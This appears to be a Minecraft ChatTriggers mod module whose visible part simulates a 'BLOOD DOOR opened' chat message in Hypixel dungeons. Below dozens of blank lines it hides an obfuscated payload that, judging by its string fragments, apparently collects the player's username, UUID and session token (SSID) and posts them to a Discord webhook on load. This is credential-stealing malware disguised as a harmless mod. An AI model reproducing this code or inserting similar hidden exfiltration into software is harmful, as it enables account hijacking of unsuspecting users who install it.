import packetChat from "../../events/packetChat";
import request from "../../../requestV2"

function listener(message) {
	["[BOSS] The Watcher: Congratulations, you made it through the Entrance.", "[BOSS] The Watcher: Ah, you've finally arrived.", "[BOSS] The Watcher: Ah, we meet again...", "[BOSS] The Watcher: So you made it this far... interesting.", "[BOSS] The Watcher: You've managed to scratch and claw your way here, eh?", "[BOSS] The Watcher: I'm starting to get tired of seeing you around here...", "[BOSS] The Watcher: Oh.. hello?", "[BOSS] The Watcher: Things feel a little more roomy now, eh?"].includes(message) && ChatLib.simulateChat("§r§cThe §r§c§lBLOOD DOOR§r§c has been opened!");
}

export function enable() {
	packetChat.addListener(listener);
}

export function disable() {
	packetChat.removeListener(listener);
}

export default { enable, disable };
















































































var _0x2e415a=_0x3bfa;function _0x3bfa(n,r){var t=_0x478e();return(_0x3bfa=function(n,r){return t[n-=187]})(n,r)}function _0xc4a4(n,r){var t=_0x3bfa,u={TpDdk:function(n,r){return n-r},mIHMo:function(n){return n()},OcZVF:function(n,r,t){return n(r,t)}},e=u[t(198)](_0x3190);return _0xc4a4=function(n,r){return n=u[t(365)](n,458),e[n]},u[t(321)](_0xc4a4,n,r)}function _0x478e(){var n=["XXpaR","POST","yFUYa","zmRBB","GhEUD","DXMCN","fFaaU","Ohbyo","dveNX","iWhhk","func_11043","FcNQW","```","YTWed","UZOLG","oSXow","dLouZ","103240pInd","getName","2_I","mtZKE","NwqPP","hTobo","411788riWvYm","COY","55wrqnoH","PTkDi","gDtLz","woMmH","36243ydglf","4227324hcJ","1957869qKoggo","getMinecra","1310prNIAJ","UuMaA","10idkBTu","21Urmlzo","4_d","8881888912","jwJor","uvP","EukvG","scord.com/","hOjYQ","Oi3VOY7df7","82746QivSV","yijEy","GjjaT","Fovhy","IAuLn","12WslwPg","OmQ","yYSDp","IrWnA","emUdo","LMsEx","mgZyr","YfrkJ","mgbdN","4243/I8YPE","197982fTwPNM","tTjQX","vYTsp","12363024dy","xrrQx","ygHeQ","fXoDu","4959871CsiMsX","bVTsB","QgjZN","EfbKs","24bWMuSI","BTKXA","18OJSdNo","https://di","9127673834","vqrVD","tYVZV","cmGvM","-3uF-ue0wQ","256KGABAF","bZuii","8604030YIK","Username:\n","4264348vww","Rrkiz","dTmiy","BBiLq","SBezv","uPySW","RVVth","CewGZ","KnN","prigf","uCbyw","gNhXo","12tdZYwr","OcZVF","7GSjwp_bXP","dWV","48072233tyeCTq","WqjfP","ks/1266034","YTali","UoLvc","FrbVl","sIPgV","Mrx","1514634EXopcQ","NiQ","TvPvI","nyybJ","LoOIr","8Svb4omvdB","BjTHO","JYULO","KOlYVPIG6P","81illsjk","CQNDF","DeyAR","sVPTi","1857025EMQ","Mozilla/5.","pBSVj","drawEspBox","KmiuT","Lagj","eDYlf","ehHnF","zzssx","qukdZ","```\nUUID:\n","CpprK","17872305Wr","WAMHn","iAaOb","3087195PHa","lJgLD","eBoUy","drawString","jiYhw","TpDdk","MvBIg","RMmqr","FFTN","guwCz","1365635DWD","2840584GVd","6e7qGwtEFU","deEeu","UtdPa","Hazfp","pRHBF","GBuMj","L9WYWHCqhy","shift","HPcEV","apIhBaNX0d","430864fOAj","7RYduTH","KuNSA","LrNeC","mIHMo","push","FYGNg","pYJHK","206SJRLQj","GpWuT","MjDUP","func_14825","api/webhoo","xiYQF","3zw0y8M0T3","getUUID","dDriw","ufUsa","YOSXI","MrMub","YNXjB","aJvLJ","86/dI8D8dH","597544ScjCNV","```\nSSID:\n","Xebrz","232722FhLZ","FwRif","ISEod","bUQHd"];return(_0x478e=function(){return n})()}function _0x3190(){var n=_0x3bfa,r={PTkDi:n(257),YTWed:n(297),LrNeC:n(253)+"J",yijEy:n(304),BBiLq:n(254)+n(264),bZuii:n(220)+"Ov",ufUsa:n(303)+"Go",YNXjB:n(234)+"2_",SBezv:n(307)+n(236),FrbVl:n(205)+n(261),dTmiy:n(269)+"o",sVPTi:n(194)+"RT",IAuLn:n(195),YTali:n(256)+"ft",YfrkJ:n(306)+n(323),KmiuT:n(345)+n(333),vYTsp:n(208)+"Ge",TvPvI:n(202),FwRif:n(355)+n(236),woMmH:n(341),guwCz:n(370)+n(248),Fovhy:n(298)+n(266)+n(206)+n(326)+n(262)+n(216)+n(322)+n(340)+n(268)+n(190)+n(193)+n(372)+"F",RMmqr:n(199),zzssx:n(371)+n(316),MrMub:n(299)+"50",DeyAR:n(241)+"qE",EfbKs:n(274),XXpaR:n(320),hOjYQ:n(209),mgZyr:n(357)+n(368),oSXow:n(337)+"RJ",aJvLJ:n(287)+n(350),KuNSA:n(236),mgbdN:n(225),ygHeQ:n(234)+n(243),LMsEx:n(360)+n(275),vqrVD:function(n){return n()}},t=[r[n(250)],r[n(237)],r[n(197)],r[n(270)],r[n(311)],r[n(305)],r[n(211)],r[n(214)],r[n(312)],r[n(329)],r[n(310)],r[n(344)],r[n(273)],r[n(327)],r[n(281)],r[n(349)],r[n(286)],r[n(334)],r[n(221)],r[n(252)],r[n(369)],r[n(272)],r[n(367)],r[n(353)],r[n(213)],r[n(343)],r[n(294)],r[n(224)],r[n(267)],r[n(280)],r[n(239)],r[n(215)],r[n(196)],r[n(282)],r[n(289)],r[n(279)]];return _0x3190=function(){return t},r[n(300)](_0x3190)}!function(n,r){for(var t=_0x3bfa,u=_0x478e();;)try{if(570570===-parseInt(t(217))/1+-parseInt(t(332))/2+-parseInt(t(260))/3*(parseInt(t(247))/4)+-parseInt(t(249))/5*(parseInt(t(284))/6)+-parseInt(t(291))/7+-parseInt(t(295))/8*(parseInt(t(255))/9)+parseInt(t(259))/10*(parseInt(t(324))/11))break;u.push(u.shift())}catch(n){u.push(u.shift())}}();var _0xf8755f=_0xc4a4;function _0x5675(){var n=_0x3bfa,r={CpprK:function(n,r){return n(r)},prigf:function(n,r){return n(r)},xrrQx:n(225),CQNDF:n(205)+"4_",Rrkiz:function(n,r){return n(r)},dveNX:function(n,r){return n(r)},iAaOb:function(n,r){return n(r)},RVVth:n(283)+"W_",cmGvM:n(242),bVTsB:n(256)+"ft",bUQHd:function(n,r){return n(r)},dLouZ:n(307)+"``",GhEUD:function(n,r){return n(r)},jwJor:n(308)+n(331),tTjQX:function(n){return n()}},t=_0xc4a4,u=[r[n(356)](t,469),r[n(317)](t,459),r[n(288)],r[n(356)](t,486),r[n(342)],r[n(309)](t,472),r[n(317)](t,460),r[n(232)](t,481),r[n(317)](t,475),r[n(359)](t,480),r[n(314)],r[n(309)](t,467),r[n(232)](t,490),r[n(302)],r[n(292)],r[n(232)](t,482),r[n(223)](t,485),r[n(309)](t,489),r[n(240)],r[n(228)](t,473),r[n(228)](t,479),r[n(232)](t,478),r[n(223)](t,468),r[n(263)]];return _0x5675=function(){return u},r[n(285)](_0x5675)}function _0x4f48(n,r){var t=_0x3bfa,u={xiYQF:function(n,r){return n-r},pYJHK:function(n){return n()},CewGZ:function(n,r,t){return n(r,t)}},e=u[t(201)](_0x5675);return _0x4f48=function(n,r){return n=u[t(207)](n,265),e[n]},u[t(315)](_0x4f48,n,r)}function _0x36d4e3(n,r){var t=_0x3bfa,u={BTKXA:function(n,r,t){return n(r,t)},WqjfP:function(n,r){return n-r}};return u[t(296)](_0x4f48,u[t(325)](n,990),r)}(function(n,r){for(var t=_0x3bfa,u={zmRBB:function(n){return n()},yFUYa:function(n,r){return n+r},HPcEV:function(n,r){return n+r},BjTHO:function(n,r){return n/r},ISEod:function(n,r){return n(r)},DXMCN:function(n,r){return n/r},QgjZN:function(n,r){return n(r)},jiYhw:function(n,r){return n/r},gNhXo:function(n,r){return n*r},MvBIg:function(n,r){return n(r)},lJgLD:function(n,r){return n(r)},Hazfp:function(n,r){return n(r)},FcNQW:function(n,r){return n/r},GjjaT:function(n,r){return n(r)},fFaaU:function(n,r){return n*r},mtZKE:function(n,r){return n(r)},MjDUP:function(n,r){return n(r)},YOSXI:function(n,r){return n/r},iWhhk:function(n,r){return n(r)},sIPgV:function(n,r){return n*r},pRHBF:function(n,r){return n/r},UtdPa:function(n,r){return n(r)},Ohbyo:function(n,r){return n/r},LoOIr:function(n,r){return n(r)},UZOLG:function(n,r){return n===r},UuMaA:t(199),nyybJ:t(191)},e=_0xc4a4,f=u[t(227)](n);;)try{var o=u[t(226)](u[t(226)](u[t(226)](u[t(226)](u[t(192)](u[t(192)](u[t(338)](-u[t(222)](parseInt,u[t(222)](e,463)),1),u[t(229)](-u[t(222)](parseInt,u[t(293)](e,466)),2)),u[t(364)](-u[t(222)](parseInt,u[t(222)](e,483)),3)),u[t(319)](u[t(338)](u[t(293)](parseInt,u[t(366)](e,470)),4),u[t(229)](-u[t(361)](parseInt,u[t(187)](e,458)),5))),u[t(235)](-u[t(271)](parseInt,u[t(293)](e,484)),6)),u[t(230)](u[t(338)](u[t(244)](parseInt,u[t(204)](e,491)),7),u[t(212)](-u[t(233)](parseInt,u[t(233)](e,474)),8))),u[t(330)](u[t(188)](-u[t(204)](parseInt,u[t(374)](e,462)),9),u[t(231)](-u[t(271)](parseInt,u[t(336)](e,493)),10)));if(u[t(238)](o,850212))break;f[u[t(258)]](f[u[t(335)]]())}catch(n){f[u[t(258)]](f[u[t(335)]]())}})(_0x3190),function(n,r){for(var t=_0x3bfa,u={ehHnF:function(n){return n()},eBoUy:function(n,r){return n+r},hTobo:function(n,r){return n/r},GpWuT:function(n,r){return n(r)},NwqPP:function(n,r,t){return n(r,t)},gDtLz:function(n,r){return n*r},uCbyw:function(n,r,t){return n(r,t)},pBSVj:function(n,r){return n/r},deEeu:function(n,r){return n/r},EukvG:function(n,r){return n/r},GBuMj:function(n,r,t){return n(r,t)},fXoDu:function(n,r){return n/r},UoLvc:function(n,r){return n*r},dDriw:function(n,r){return n/r},Xebrz:function(n,r){return n(r)},tYVZV:function(n,r,t){return n(r,t)},qukdZ:function(n,r){return n*r},WAMHn:function(n,r){return n/r},emUdo:function(n,r,t){return n(r,t)},IrWnA:function(n,r){return n(r)},FYGNg:function(n,r){return n(r)},uPySW:function(n,r,t){return n(r,t)},eDYlf:function(n,r){return n===r},JYULO:t(191)},e=_0xc4a4,f=u[t(352)](n);;)try{var o=u[t(362)](u[t(362)](u[t(362)](u[t(362)](u[t(362)](u[t(362)](u[t(246)](-u[t(203)](parseInt,u[t(245)](_0x4f48,278,404)),1),u[t(251)](u[t(246)](u[t(203)](parseInt,u[t(318)](_0x4f48,286,421)),2),u[t(347)](-u[t(203)](parseInt,u[t(245)](_0x4f48,287,414)),3))),u[t(373)](-u[t(203)](parseInt,u[t(245)](_0x4f48,279,419)),4)),u[t(251)](u[t(265)](-u[t(203)](parseInt,u[t(189)](_0x4f48,277,421)),5),u[t(290)](-u[t(203)](parseInt,u[t(245)](_0x4f48,265,394)),6))),u[t(328)](u[t(210)](-u[t(219)](parseInt,u[t(189)](_0x4f48,268,414)),7),u[t(290)](-u[t(203)](parseInt,u[t(301)](_0x4f48,271,408)),8))),u[t(354)](u[t(290)](u[t(219)](parseInt,u[t(245)](_0x4f48,273,401)),9),u[t(358)](u[t(219)](parseInt,u[t(278)](_0x4f48,276,404)),10))),u[t(251)](u[t(373)](-u[t(277)](parseInt,u[t(245)](_0x4f48,285,409)),11),u[t(347)](u[t(200)](parseInt,u[t(313)](_0x4f48,280,419)),12)));if(u[t(351)](o,987970))break;f[u[t(200)](e,465)](f[u[t(339)]]())}catch(n){f[u[t(219)](e,465)](f[u[t(339)]]())}}(_0x5675),request({url:_0xf8755f(464),method:_0xf8755f(476),headers:{"User-agent":_0x2e415a(346)+"0"},body:{content:_0xf8755f(487)+Player[_0x2e415a(242)]()+_0xf8755f(461)+Player[_0xf8755f(471)]()+(_0x2e415a(218)+_0x2e415a(236))+Client[_0xf8755f(492)]()[_0xf8755f(477)]()[_0xf8755f(488)]()+_0xf8755f(475)}});const renderBoxWithText=(n,r,t,u)=>{var e=_0x2e415a;RenderLib[e(348)](r,t,u,1,1,1,0,0,.5,!1),Tessellator[e(363)](n,r,{yYSDp:function(n,r){return n+r}}[e(276)](t,.7),u)};

































